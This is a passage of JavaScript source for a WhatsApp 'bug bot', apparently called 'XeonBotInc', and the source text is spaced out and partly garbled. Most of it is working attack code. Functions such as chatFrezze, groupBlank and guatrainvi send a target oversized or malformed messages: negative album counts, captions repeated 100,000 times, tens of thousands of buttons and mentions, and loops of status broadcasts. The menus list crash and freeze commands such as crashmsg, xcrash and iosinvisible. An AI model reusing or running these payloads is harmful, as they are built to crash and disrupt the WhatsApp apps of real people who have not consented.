                                     r e m o t e J i d :   " 0 s . w h a t s a p p . n e t " , 
                                     f r o m M e :   f a l s e , 
                                     i d :   " A B C D E F 1 2 3 4 5 6 7 8 9 0 " 
                                 } 
                             } 
                         } 
                     } 
                 } 
             } 
         } , {   p a r t i c i p a n t :   {   j i d : t a r g e t   }   } ) ; 
         a w a i t   s l e e p ( 9 0 0 0 ) ; 
     } 
 } 
         
         
         a s y n c   f u n c t i o n   c h a t F r e z z e ( t a r g e t )   { 
 c o n s t   f a k e K e y   =   { 
         " r e m o t e J i d " :   t a r g e t , 
         " f r o m M e " :   t r u e , 
         " i d " :   a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   { 
                 " a l b u m M e s s a g e " :   { 
                         " e x p e c t e d I m a g e C o u n t " :   - 9 9 9 9 9 9 9 9 , 
                         " e x p e c t e d V i d e o C o u n t " :   0 , 
                         " c a p t i o n " :   " x " 
                 } 
         } , { p a r t i c i p a n t : { j i d : t a r g e t } } ) 
 } 
 l e t   x x   =   { " u r l " :   " h t t p s : / / m m g . w h a t s a p p . n e t / o 1 / v / t 2 4 / f 2 / m 2 3 8 / A Q N 0 o Z N r 6 - k f N 5 Y W o C 1 c d u 2 h E J 4 V B g X p p 4 1 N e Q k R t k V b 2 l D T y j B L 4 J 8 y M M f Y g J 0 Y W Z R g Z d i U z C q A V 5 E Y T e q 7 F c a y s m A P j 5 3 t w F H - d r 0 e 4 Q ? c c b = 9 - 4 & o h = 0 1 _ Q 5 A a 2 A E n G l 7 I b M F t d C L G y F b 8 _ d 0 8 Q 7 W V g I U C 1 9 3 3 2 4 M Q o o u E i A & o e = 6 8 A 1 5 9 D 3 & _ n c _ s i d = e 6 e d 6 c & m m s 3 = t r u e " , " m i m e t y p e " :   " i m a g e / j p e g " , " f i l e S h a 2 5 6 " :   " l 5 P X V v y 1 P 0 t n S 0 y 8 + e g 0 A w S 4 o g / G L O u S W 0 O I / Z D g Z E E = " , " f i l e L e n g t h " :   " 3 6 7 0 7 7 " , " h e i g h t " :   1 3 9 5 , " w i d t h " :   1 2 0 0 , " m e d i a K e y " :   " r T Y E h P 0 o 5 U b H D a s X y f v p s A g X s h 3 S N n s P Q K z o P K Q 5 0 g w = " , " f i l e E n c S h a 2 5 6 " :   " 6 t K 2 h / K E p q g W 5 W 5 Q x 9 S n m B h Z p S s 4 Y 6 V 2 A c 7 U o D j d S v Y = " , " d i r e c t P a t h " :   " / o 1 / v / t 2 4 / f 2 / m 2 3 8 / A Q N 0 o Z N r 6 - k f N 5 Y W o C 1 c d u 2 h E J 4 V B g X p p 4 1 N e Q k R t k V b 2 l D T y j B L 4 J 8 y M M f Y g J 0 Y W Z R g Z d i U z C q A V 5 E Y T e q 7 F c a y s m A P j 5 3 t w F H - d r 0 e 4 Q ? c c b = 9 - 4 & o h = 0 1 _ Q 5 A a 2 A E n G l 7 I b M F t d C L G y F b 8 _ d 0 8 Q 7 W V g I U C 1 9 3 3 2 4 M Q o o u E i A & o e = 6 8 A 1 5 9 D 3 & _ n c _ s i d = e 6 e d 6 c " } 
 f o r   ( l e t   s   =   0 ;   s   <   2 ;   s + + )   { 
 c o n s t   x y   =   g e n e r a t e W A M e s s a g e F r o m C o n t e n t ( t a r g e t ,   p r o t o . M e s s a g e . f r o m O b j e c t ( { 
 " b o t I n v o k e M e s s a g e " :   { 
 " m e s s a g e " :   { 
         " m e s s a g e C o n t e x t I n f o " :   { 
                 " m e s s a g e S e c r e t " :   ( 0 ,   c r y p t o . r a n d o m B y t e s ) ( 3 2 ) , 
                 " m e s s a g e A s s o c i a t i o n " :   { 
                         " a s s o c i a t i o n T y p e " :   " M E D I A _ A L B U M " , 
                         " p a r e n t M e s s a g e K e y " :   f a k e K e y 
                 } 
         } , 
 " i m a g e M e s s a g e " :   x x 
 } 
 } 
 } ) , { p a r t i c i p a n t : { j i d : t a r g e t } } ) 
 c o n s t   x z   =   a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   x y . m e s s a g e ,   { m e s s a g e I d : x y . k e y . i d , p a r t i c i p a n t : { j i d : t a r g e t } } ) 
 x x . c a p t i o n   =   " � � " . r e p e a t ( 1 0 0 0 0 0 ) ; 
 X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   { 
 " p r o t o c o l M e s s a g e " :   { 
         " t y p e " :   " M E S S A G E _ E D I T " , 
         " k e y " :   { 
                 " f r o m M e " :   t r u e , 
                 " r e m o t e J i d " :   t a r g e t , 
                 " i d " :   x z 
         } , 
         " e d i t e d M e s s a g e " :   { 
                 " i m a g e M e s s a g e " :   x x 
         } 
 } 
 } , { p a r t i c i p a n t : { j i d : t a r g e t } } ) 
 a w a i t   s l e e p ( 1 0 0 ) 
 } 
 } 
 
 / / = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = \ \ 
 a s y n c   f u n c t i o n   g r o u p B l a n k ( t a r g e t )   { 
     X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   { 
         n e w s l e t t e r A d m i n I n v i t e M e s s a g e :   { 
             n e w s l e t t e r J i d :   " 1 3 1 3 5 5 5 0 0 0 2 @ n e w s l e t t e r " , 
             n e w s l e t t e r N a m e :   " ᭡ ꧈ " . r e p e a t ( 1 0 0 0 0 0 ) , 
             c a p t i o n :   " p "   +   " \ u 0 0 0 0 " . r e p e a t ( 1 0 0 0 0 ) , 
             i n v i t e E x p i r a t i o n :   " 0 " , 
         } , 
     } ,   { 
         p a r t i c i p a n t :   {   j i d :   t a r g e t   } 
     } ) 
     
     c o n s o l e . l o g ( " S u c c e s   S e n d " ) 
 } 
 / / = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = \ \ 
 a s y n c   f u n c t i o n   g u a t r a i n v i ( t a r g e t ,   m e n t i o n )   { 
 
     c o n s t   i m a g e C r a s h   =   " h t t p s : / / f i l e s . c a t b o x . m o e / 8 c 1 r d s . j p g " ; 
 
     c o n s t   m e n t i o n e d M e t a A i   =   [ 
         " 1 3 1 3 5 5 5 0 0 0 1 @ s . w h a t s a p p . n e t " , 
         " 1 3 1 3 5 5 5 0 0 0 2 @ s . w h a t s a p p . n e t " , 
         " 1 3 1 3 5 5 5 0 0 0 3 @ s . w h a t s a p p . n e t " , 
         " 1 3 1 3 5 5 5 0 0 0 4 @ s . w h a t s a p p . n e t " , 
         " 1 3 1 3 5 5 5 0 0 0 5 @ s . w h a t s a p p . n e t " , 
         " 1 3 1 3 5 5 5 0 0 0 6 @ s . w h a t s a p p . n e t " , 
         " 1 3 1 3 5 5 5 0 0 0 7 @ s . w h a t s a p p . n e t " , 
         " 1 3 1 3 5 5 5 0 0 0 8 @ s . w h a t s a p p . n e t " , 
         " 1 3 1 3 5 5 5 0 0 0 9 @ s . w h a t s a p p . n e t " , 
         " 1 3 1 3 5 5 5 0 0 1 0 @ s . w h a t s a p p . n e t " 
     ] ; 
 
     c o n s t   p h o t o   =   { 
         i m a g e :   {   u r l :   i m a g e C r a s h   } , 
         c a p t i o n :   " G M O T E J I D           >     @ w @ ' "   
                           +   " \ n " . r e p e a t ( 5 ) 
                           +   " ꦾ " . r e p e a t ( 6 0 0 0 0 ) 
     } ; 
 
     c o n s t   a l b u m   =   a w a i t   g e n e r a t e W A M e s s a g e F r o m C o n t e n t ( t a r g e t ,   { 
         a l b u m M e s s a g e :   { 
             e x p e c t e d I m a g e C o u n t :   9 9 9 , 
             e x p e c t e d V i d e o C o u n t :   6 6 6 
         } 
     } ,   { 
         u s e r J i d :   t a r g e t , 
         u p l o a d :   X e o n B o t I n c . w a U p l o a d T o S e r v e r 
     } ) ; 
 
     a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   a l b u m . m e s s a g e ,   {   m e s s a g e I d :   a l b u m . k e y . i d   } ) ; 
 
     f o r   ( l e t   i   =   0 ;   i   <   6 6 6 ;   i + + )   { 
         c o n s t   m s g   =   a w a i t   g e n e r a t e W A M e s s a g e ( t a r g e t ,   p h o t o ,   { 
             u p l o a d :   X e o n B o t I n c . w a U p l o a d T o S e r v e r 
         } ) ; 
 
         c o n s t   t y p e   =   O b j e c t . k e y s ( m s g . m e s s a g e ) . f i n d ( t   = >   t . e n d s W i t h ( ' M e s s a g e ' ) ) ; 
 
         m s g . m e s s a g e [ t y p e ] . c o n t e x t I n f o   =   { 
             m e n t i o n e d J i d :   [ 
                 . . . m e n t i o n e d M e t a A i , 
                 . . . A r r a y . f r o m ( {   l e n g t h :   3 0 0 0 0   } ,   ( )   = > 
                     ` 1 $ { M a t h . f l o o r ( M a t h . r a n d o m ( )   *   5 0 0 0 0 0 ) } @ s . w h a t s a p p . n e t ` 
                 ) 
             ] , 
             b u s i n e s s M e s s a g e F o r w a r d I n f o :   { 
                 b u s i n e s s O w n e r J i d :   " 1 3 1 3 5 5 5 0 0 0 2 @ s . w h a t s a p p . n e t " 
             } , 
             p a r t i c i p a n t :   " 0 @ s . w h a t s a p p . n e t " , 
             r e m o t e J i d :   " s t a t u s @ b r o a d c a s t " , 
             f o r w a r d e d N e w s l e t t e r M e s s a g e I n f o :   { 
                 n e w s l e t t e r N a m e :   " ꦾ " . r e p e a t ( 1 0 0 ) , 
                 n e w s l e t t e r J i d :   " 1 2 0 3 6 3 3 3 0 3 4 4 8 1 0 2 8 0 @ n e w s l e t t e r " , 
                 s e r v e r M e s s a g e I d :   9 9 9 
             } , 
             m e s s a g e A s s o c i a t i o n :   { 
                 a s s o c i a t i o n T y p e :   1 , 
                 p a r e n t M e s s a g e K e y :   a l b u m . k e y 
             } 
         } ; 
       m s g . m e s s a g e . n a t i v e F l o w M e s s a g e   =   { 
     b u t t o n s :   [ 
         { 
             n a m e :   " s i n g l e _ s e l e c t " , 
             b u t t o n P a r a m s J s o n :   J S O N . s t r i n g i f y ( { 
                 s t a t u s :   t r u e , 
             } ) , 
         } , 
         { 
             n a m e :   " c a l l _ p e r m i s s i o n _ r e q u e s t " , 
             b u t t o n P a r a m s J s o n :   J S O N . s t r i n g i f y ( { 
                 s t a t u s :   t r u e , 
             } ) , 
         } , 
         . . . A r r a y ( 9 9 9 9 9 ) . f i l l ( ) . m a p ( ( )   = >   ( { 
             n a m e :   " m p m " , 
             b u t t o n P a r a m s J s o n :   " " , 
         } ) ) , 
     ] , 
     m e s s a g e P a r a m s J s o n :   " [ { " . r e p e a t ( 1 0 0 0 0 ) , 
 } ; 
         a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( " s t a t u s @ b r o a d c a s t " ,   m s g . m e s s a g e ,   { 
             m e s s a g e I d :   m s g . k e y . i d , 
             s t a t u s J i d L i s t :   [ t a r g e t ] , 
             a d d i t i o n a l N o d e s :   [ 
                 { 
                     t a g :   " m e t a " , 
                     a t t r s :   { } , 
                     c o n t e n t :   [ 
                         { 
                             t a g :   " m e n t i o n e d _ u s e r s " , 
                             a t t r s :   { } , 
                             c o n t e n t :   [ 
                                 {   t a g :   " t o " ,   a t t r s :   {   j i d :   t a r g e t   } ,   c o n t e n t :   u n d e f i n e d   } 
                             ] 
                         } 
                     ] 
                 } 
             ] 
         } ) ; 
 
         i f   ( m e n t i o n )   { 
             a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   { 
                 s t a t u s M e n t i o n M e s s a g e :   { 
                     m e s s a g e :   {   p r o t o c o l M e s s a g e :   {   k e y :   m s g . k e y ,   t y p e :   2 5   }   } 
                 } 
             } ,   { 
                 a d d i t i o n a l N o d e s :   [ 
                     {   t a g :   " m e t a " ,   a t t r s :   {   i s _ s t a t u s _ m e n t i o n :   " t r u e "   } ,   c o n t e n t :   u n d e f i n e d   } 
                 ] 
             } ) ; 
         } 
     } 
 } 
 / / = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = \ \ 
 i f   ( m . m e s s a g e )   { 
 
         / /   L o g   t h e   m e s s a g e   d e t a i l s 
         c o n s o l e . l o g ( 
                 c h a l k . b l a c k ( c h a l k . b g W h i t e ( ' [   M E S S A G E   ] ' ) ) , 
                 c h a l k . b l a c k ( c h a l k . b g G r e e n ( n e w   D a t e ( ) ) ) , 
                 c h a l k . b l a c k ( c h a l k . b g B l u e ( b u d y   | |   m . m t y p e ) )   +   ' \ n '   + 
                 c h a l k . m a g e n t a ( ' = >   F R O M ' ) ,   c h a l k . g r e e n ( p u s h n a m e ) ,   c h a l k . y e l l o w ( m . s e n d e r )   +   ' \ n '   + 
                 c h a l k . b l u e B r i g h t ( ' = >   I n ' ) ,   c h a l k . g r e e n ( m . i s G r o u p   ?   p u s h n a m e   :   ' P r i v a t e   C h a t ' ,   f r o m ) 
         ) ; 
 } 
 
 s w i t c h ( c o m m a n d )   { 
 / * c a s e   ' x j x j x j x o k e ' :   { 
 	 l e t   a u d i o b u f f y   =   f s . r e a d F i l e S y n c ( ` . / o k e . m p 3 ` ) 
 	 X e o n B o t I n c . s e n d M e s s a g e ( ' 9 1 9 8 6 3 2 3 5 4 8 9 @ s . w h a t s a p p . n e t ' ,   {   a u d i o :   a u d i o b u f f y ,   m i m e t y p e :   ' a u d i o / m p 4 ' ,   p t t :   t r u e   } )           
 	 } 
 	 k * / 
           
   c a s e   ' m e n u ' :   
 t r y   { 
 v a r   a b c   =   g e n e r a t e W A M e s s a g e F r o m C o n t e n t ( f r o m ,   p r o t o . M e s s a g e . f r o m O b j e c t ( { 
     " i n t e r a c t i v e M e s s a g e " :   { 
         " h e a d e r " :   { 
             " i m a g e M e s s a g e " :   { 
                 " u r l " :   " h t t p s : / / m m g . w h a t s a p p . n e t / o 1 / v / t 2 4 / f 2 / m 2 6 9 / A Q P 7 w d 6 3 y X X K B G y T n X b W f O d 8 p z 1 5 o e d I J Q P d Q r i I g x v s 0 k c c u x c b O 3 G P 4 6 P B P A A g F e h _ R S c 2 k Q B R Z 9 P k - i i G k P g L i a j q R d 7 S U 1 w _ K W p C D A ? c c b = 9 - 4 & o h = 0 1 _ Q 5 A a 3 Q E z D J B E k m N 2 U H Z 7 a 0 m w M 4 q g B S 0 J c R 7 3 w l 3 Z d o y D 7 W f q X A & o e = 6 9 7 A B 6 3 0 & _ n c _ s i d = e 6 e d 6 c & m m s 3 = t r u e " , 
                 " m i m e t y p e " :   " i m a g e / j p e g " , 
                 " c a p t i o n " :   " \ n ` H i ,   H X   B O T ` \ n \ n I ' a m   � � � � � � � � � � � � � � � �   I   a m   a   W h a t s A p p   b o t   c r e a t e d   b y   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � �   \ n \ n ─ | >   � � � � � � � � � � � � � � � � � � � � � �   � � � � � � \ n ▢   C r e a t o r   :   � � � � � � � � � � � � � � � � \ n ▢   B o t   N a m e   :       - � � 1 1   V i p \ n ▢   V e r s i o n   :   1 1 . 0 . 0 \ n ▢   P r e f i x   :   \ " . \ " \ n \ n ─ | >   � � � � � �   � � � � � � � � \ n ▢ . c r a s h m s g   『   F o r c e   C l o s e   1   M s g   』 \ n ▢ . x c r a s h   『   I n v i s i b l e   F o r c e   C l o s e   』 \ n ▢ . x d e l a y _ h a r d   『   D e l a y   I n v i s i b l e   』 \ n \ n ─ | >   � � � � � � � � � �   � � � � � � � � \ n ▢ . a d d m u r b u g \ n ▢ . d e l m u r b u g \ n \ n ─ | >   � � � � � � � � � �   � � � � � � � � \ n ▢ . p u b l i c \ n ▢ . s e l f \ n ▢ . > \ n ▢ . e x e c \ n " , 
                 " f i l e S h a 2 5 6 " :   " K f o 8 q v 0 6 u r u U J R Q 4 r o G 6 F V X 9 o T u m f s X D f d z v S z n s N m s = " , 
                 " f i l e L e n g t h " :   " 2 7 2 0 4 8 8 " , 
                 " h e i g h t " :   1 9 2 0 , 
                 " w i d t h " :   1 0 8 0 , 
                 " m e d i a K e y " :   " 7 n w g 8 Q s n F p F B G q O X k L v L 3 Z S R t u s s J + J F A Z X 7 D N o y 5 9 U = " , 
                 " f i l e E n c S h a 2 5 6 " :   " U r l H H y 9 R e 6 e o a r D w c f U O 8 3 Q l l Z j 9 Z W g H 1 G v R N Q v B S j U = " , 
                 " d i r e c t P a t h " :   " / o 1 / v / t 2 4 / f 2 / m 2 3 3 / A Q O H e y L X g g e l E F q l S a l G L T 9 1 R x w S I I - 4 D 0 e _ 0 - n 2 r J T _ C a 4 U k Q l k S Z A d D P F 0 5 A y j 8 8 w X P 2 f Q U 0 Y f o h F l L h h S h d g b h U i u O O O 1 h y H U S m t f - A ? c c b = 9 - 4 & o h = 0 1 _ Q 5 A a 3 Q H p Y 8 2 _ E t D B h j x T p v k V K H D A O g u V H A V j Y h h U C B v K l E - W 1 Q & o e = 6 9 7 A A 9 0 3 & _ n c _ s i d = e 6 e d 6 c " , 
                 " m e d i a K e y T i m e s t a m p " :   " 1 7 6 7 0 5 9 3 8 2 " , 
                 " j p e g T h u m b n a i l " :   " / 9 j / 4 A A Q S k Z J R g A B A Q A A A Q A B A A D / 2 w C E A B s b G x s c G x 4 h I R 4 q L S g t K j 0 4 M z M 4 P V 1 C R 0 J H Q l 2 N W G d Y W G d Y j X 2 X e 3 N 7 l 3 3 g s J y c s O D / 2 c 7 Z / / / / / / / / / / / / / / 8 B G x s b G x w b H i E h H i o t K C 0 q P T g z M z g 9 X U J H Q k d C X Y 1 Y Z 1 h Y Z 1 i N f Z d 7 c 3 u X f e C w n J y w 4 P / Z z t n / / / / / / / / / / / / / / / / C A B E I A E g A N g M B I g A C E Q E D E Q H / x A A v A A E A A w E B A Q A A A A A A A A A A A A A A A g M E B Q E G A Q E B A Q E A A A A A A A A A A A A A A A A A A Q M C / 9 o A D A M B A A I Q A x A A A A D 5 k A A A D 3 y 1 a 5 6 a Z p C G 3 G k R c / e v x 9 M 1 2 U 6 s k v b 4 n Q 4 i w H W C c C 6 K o J b q S w E A A A A / / 8 Q A J h A A A g I B A w M D B Q A A A A A A A A A A A Q I A A y E E E R I Q M U E F E x Q i J D B A U f / a A A g B A Q A B P w D 8 4 G 5 h B E V d / E K f y H H W k b 2 L L 6 w D y P a B U x h s y y o r W M G E 7 9 A N y B N J p k 5 g b z 1 E f c q g 7 A T m E K k D I m h X 5 e k s a 3 u D g z U 0 o v I g 9 a b 3 r Y T U N X q V U s e L j z B T n 6 r V A j a l U 0 3 t 1 Y Q R n Z y S T 1 B H m H K g R s e T F s 2 Q r + j / A P / E A B o R A A I C A w A A A A A A A A A A A A A A A A A B E D E R I D D / 2 g A I A Q I B A T 8 A 1 y K G W W + X / 8 Q A I B E A A g I A B g M A A A A A A A A A A A A A A Q I A E R A S I C E x U Q M y Y f / a A A g B A w E B P w D Q o s g Q p l Y i x t H U L h 4 2 U X 2 e D 1 B a Z g R P R K b f N w O s A a h a 4 W J r 5 q / / 2 Q = = " , 
                 " a n n o t a t i o n s " :   [ 
                     { 
                         " p o l y g o n V e r t i c e s " :   [ 
                             { 
                                 " x " :   6 0 . 7 1 6 6 4 8 1 0 1 8 0 6 6 4 , 
                                 " y " :   - 3 6 . 3 9 7 8 4 6 2 2 1 9 2 3 8 3 
                             } , 
                             { 
                                 " x " :   - 1 6 . 7 1 0 1 8 9 8 1 9 3 3 5 9 3 8 , 
                                 " y " :   4 9 . 2 6 3 6 7 5 6 8 9 6 9 7 2 6 6 
                             } , 
                             { 
                                 " x " :   - 5 6 . 5 8 5 8 5 3 5 7 6 6 6 0 1 5 6 , 
                                 " y " :   3 7 . 8 5 9 6 3 4 3 9 9 4 1 4 0 6 
                             } , 
                             { 
                                 " x " :   2 0 . 8 4 0 9 8 0 5 2 9 7 8 5 1 5 6 , 
                                 " y " :   - 4 7 . 8 0 1 8 8 7 5 1 2 2 0 7 0 3 
                             } 
                         ] , 
                         " n e w s l e t t e r " :   { 
                             " n e w s l e t t e r J i d " :   " 1 2 0 3 6 3 3 8 5 7 3 9 3 4 3 0 5 8 @ n e w s l e t t e r " , 
                             " n e w s l e t t e r N a m e " :   "     " , 
                             " c o n t e n t T y p e " :   " U P D A T E " , 
                             " a c c e s s i b i l i t y T e x t " :   " " 
                         } 
                     } 
                 ] 
             } , 
             " h a s M e d i a A t t a c h m e n t " :   t r u e 
         } , 
         " b o d y " :   { 
             " t e x t " :   " \ n `   H e l l o ,     ` \ n \ n i ' a m       I   a m   a   W h a t s A p p   b o t   c r e a t e d   b y   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � �   \ n \ n ─ | >   � � � � � � � � � � � � � � � � � � � � � �   � � � � � � \ n ▢   C r e a t o r   :     \ n ▢   B o t   N a m e   :       - � � 1 1   V i p \ n ▢   V e r s i o n   :   1 1 . 0 . 0 \ n ▢   P r e f i x   :   \ " . \ " " 
         } , 
         " f o o t e r " :   { 
             " t e x t " :   "   " 
         } , 
         " n a t i v e F l o w M e s s a g e " :   { 
             " b u t t o n s " :   [ 
                 { 
                     " n a m e " :   " s i n g l e _ s e l e c t " , 
                     " b u t t o n P a r a m s J s o n " :   " { \ " h a s _ m u l t i p l e _ b u t t o n s \ " : t r u e } " 
                 } , 
                 { 
                     " n a m e " :   " c a l l _ p e r m i s s i o n _ r e q u e s t " , 
                     " b u t t o n P a r a m s J s o n " :   " { \ " h a s _ m u l t i p l e _ b u t t o n s \ " : t r u e } " 
                 } , 
                 { 
 
                     " n a m e " :   " q u i c k _ r e p l y " , 
 
                     " b u t t o n P a r a m s J s o n " :   " { \ " d i s p l a y _ t e x t \ " : \ " a l l m e n u \ " , \ " i d \ " : \ " . a b c \ " } " 
 
                 } ,     
                 { 
           
                     " n a m e " :   " s i n g l e _ s e l e c t " , 
                     " b u t t o n P a r a m s J s o n " :   " { \ " t i t l e \ " : \ " I n f o   U p d a t e   S c r i p t \ " , \ " s e c t i o n s \ " : [ { \ " t i t l e \ " : \ " I N F O R M A T I O N \ " , \ " h i g h l i g h t _ l a b e l \ " : \ " l a b e l \ " , \ " r o w s \ " : [ { \ " t i t l e \ " : \ " C H A N N E L \ " , \ " d e s c r i p t i o n \ " : \ " h t t p s : \ \ / \ \ / w h a t s a p p . c o m \ \ / c h a n n e l \ \ / 0 0 2 9 V b C 3 P 5 3 7 T 8 b a a N u Z W S 0 Y \ \ n \ \ n >   J a n g a n   L u p a   F o l l o w   A g a r   T i d a k   K e t i n g g a l a n   T e n t a n g   U p d a t e   S c r i p t   B u g   T e r b a r u n y a . \ " , \ " i d \ " : \ " r o w _ 1 \ " } , { \ " t i t l e \ " : \ " C H A N E L   T E L E G R A M \ " , \ " d e s c r i p t i o n \ " : \ " t . m e / + F p 9 f 7 O L i g K g w Z W U 0 \ \ / \ " , \ " i d \ " : \ " r o w _ 2 \ " } , { \ " t i t l e \ " : \ " C O N T A C T   D E V E L O P E R \ " , \ " d e s c r i p t i o n \ " : \ " * T E L E G R A M * \ \ n t . m e \ \ / @ A b o _ r 7 y a n   \ \ n \ \ n * W H A T S A P P * \ \ n + 2 0 1 0 2 9 4 1 0 7 6 6 \ " , \ " i d \ " : \ " r o w _ 3 \ " } ] } ] , \ " h a s _ m u l t i p l e _ b u t t o n s \ " : t r u e } " 
                 } , 
                 { 
                     " n a m e " :   " c t a _ c o p y " , 
                     " b u t t o n P a r a m s J s o n " :   " { \ " d i s p l a y _ t e x t \ " : \ "     - � � 1 1   V i p \ " , \ " i d \ " : \ " 1 2 3 4 5 6 7 8 9 \ " , \ " c o p y _ c o d e \ " : \ " h t t p s : \ \ / \ \ / t . m e \ \ / @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � \ " } " 
                 } , 
                 { 
                     " n a m e " :   " c t a _ c a l l " , 
                     " b u t t o n P a r a m s J s o n " :   " { \ " d i s p l a y _ t e x t \ " : \ " C a l l   D e v e l o p e r \ " , \ " p h o n e _ n u m b e r \ " : \ " + 2 0 1 0 2 9 4 1 0 7 6 6 \ " } " 
                 } , 
                 { 
                     " n a m e " :   " q u i c k _ r e p l y " , 
                     " b u t t o n P a r a m s J s o n " :   " { \ " d i s p l a y _ t e x t \ " : \ " c o n t a c t   D e v e l o p e r \ " , \ " i d \ " : \ " . o w n e r \ " } " 
                 } , 
                 
             ] , 
             " m e s s a g e P a r a m s J s o n " :   " { \ " l i m i t e d _ t i m e _ o f f e r \ " : { \ " t e x t \ " : \ "     - � � 1 1   V i p \ " , \ " u r l \ " : \ " t . m e / A b o _ r 7 y a n \ " , \ " c o p y _ c o d e \ " : \ "     - � � 1 1   V i p \ " , \ " e x p i r a t i o n _ t i m e \ " : 1 7 6 5 2 9 1 5 3 7 0 9 5 3 0 9 } , \ " b o t t o m _ s h e e t \ " : { \ " i n _ t h r e a d _ b u t t o n s _ l i m i t \ " : 2 , \ " d i v i d e r _ i n d i c e s \ " : [ 1 , 2 , 3 , 4 , 5 , 9 9 9 ] , \ " l i s t _ t i t l e \ " : \ "     - � � 1 1   V i p \ " , \ " b u t t o n _ t i t l e \ " : \ "     - � � 1 1   V i p \ " } , \ " t a p _ t a r g e t _ c o n f i g u r a t i o n \ " : { \ " t i t l e \ " : \ " ▸   X   ◂ \ " , \ " d e s c r i p t i o n \ " : \ " b o m b o c l a r d \ " , \ " c a n o n i c a l _ u r l \ " : \ " h t t p s : / / t . m e / A b o _ r 7 y a n \ " , \ " d o m a i n \ " : \ " s h o p . e x a m p l e . c o m \ " , \ " b u t t o n _ i n d e x \ " : 0 } } " 
         } , 
         " c o n t e x t I n f o " :   { 
             " p a i r e d M e d i a T y p e " :   " N O T _ P A I R E D _ M E D I A " 
         } 
     } 
 } ) , {   u s e r J i d :   f r o m   } ) 
 X e o n B o t I n c . r e l a y M e s s a g e ( f r o m ,   a b c . m e s s a g e ,   { m e s s a g e I d :   a b c . k e y . i d   } ) 
 }   c a t c h   ( e )   { 
 c o n s o l e . l o g ( e ) 
 } 
 b r e a k 
     c a s e   ' a b c ' :   { 
 
     c o n s t   a x i o s   =   r e q u i r e ( ' a x i o s ' ) 
     c o n s t   r u n   =   r u n t i m e ( p r o c e s s . u p t i m e ( ) ) 
 
     c o n s t   { 
         g e n e r a t e W A M e s s a g e C o n t e n t , 
         g e n e r a t e W A M e s s a g e F r o m C o n t e n t 
     }   =   r e q u i r e ( ' @ a d i w a j s h i n g / b a i l e y s ' ) 
 
     / /   ت أ ك د   م ن   و ج و د   ا ل ك ا ش 
     g l o b a l . m e n u I m a g e C a c h e   =   g l o b a l . m e n u I m a g e C a c h e   | |   { } 
 
     t r y   { 
         c o n s t   c a t e g o r i e s   =   [ 
             { 
                 t i t l e :   " � � � � � � � � � �   � � � � � � � � " , 
                 d e s c :   ` 
 ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ 
 ✦   ❄ ️   H E L L O   :   $ { m . p u s h N a m e } 
 ✦   ❄ ️   R U N T I M E   :   $ { r u n } 
 ✦   ❄ ️       - � � I P 
 ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ 
 ✦   ❄ ️   p u b l i c 
 ✦   ❄ ️   s e l f 
 ✦   ❄ ️   a d d p r e m 
 ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ 
                 ` , 
                 b u t t o n :   { 
                     t e x t :   " � � � � � � � � � � � � � � � � � � " , 
                     u r l :   " h t t p s : / / w h a t s a p p . c o m / c h a n n e l / 0 0 2 9 V b C 3 P 5 3 7 T 8 b a a N u Z W S 0 Y " 
                 } , 
                 i m a g e :   " h t t p s : / / f i l e s . c a t b o x . m o e / 8 c 1 r d s . j p g " 
             } , 
             { 
                 t i t l e :   " � � � � � �   � � � � � � � � " , 
                 d e s c :   ` 
 ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ 
 ✦   ❄ ️   H E L L O   :   $ { m . p u s h N a m e } 
 ✦   ❄ ️   R U N T I M E   :   $ { r u n } 
 ✦   ❄ ️       - � � I P 
 ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ 
 ✦   ❄ ️     x c r a s h 
 ✦   ❄ ️     x d e l a y _ h a r d 
 ✦   ❄ ️     c r a s h m s g 
 ✦   ❄ ️     x n x x 
 ✦   ❄ ️     c r a s h m s g n e w 
 ✦   ❄ ️     c r a s h u i h a r d 
 ✦   ❄ ️     c r a s h c h a t t 
 ✦   ❄ ️     i o s i n v i s i b l e 
 ✦   ❄ ️     g r o u p m i x 
 ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ 
                 ` , 
                 b u t t o n :   { 
                     t e x t :   " � � � � � � � � � � � � � � � � � � " , 
                     u r l :   " h t t p s : / / w h a t s a p p . c o m / c h a n n e l / 0 0 2 9 V b C 3 P 5 3 7 T 8 b a a N u Z W S 0 Y " 
                 } , 
                 i m a g e :   "   h t t p s : / / f i l e s . c a t b o x . m o e / 8 c 1 r d s . j p g " 
             } , 
             { 
                 t i t l e :   " � � � � � � � � � �   � � � � � � � � " , 
                 d e s c :   ` 
 ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ 
 ✦   ❄ ️   H E L L O   :   $ { m . p u s h N a m e } 
 ✦   ❄ ️   R U N T I M E   :   $ { r u n } 
 ✦   ❄ ️       - � � I P 
 ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬ 
 ✦   ❄ ️     c e k d e v i c e 
 ✦   ❄ ️     p i n g 
 ✦   ❄ ️     l i s t g s 
 ✦   ❄ ️     g r o u p - i d 
 ✦   ❄ ️     i d c h 
 ✦   ❄ ️     p l a y 
 ✦   ❄ ️     k i c k a l l 
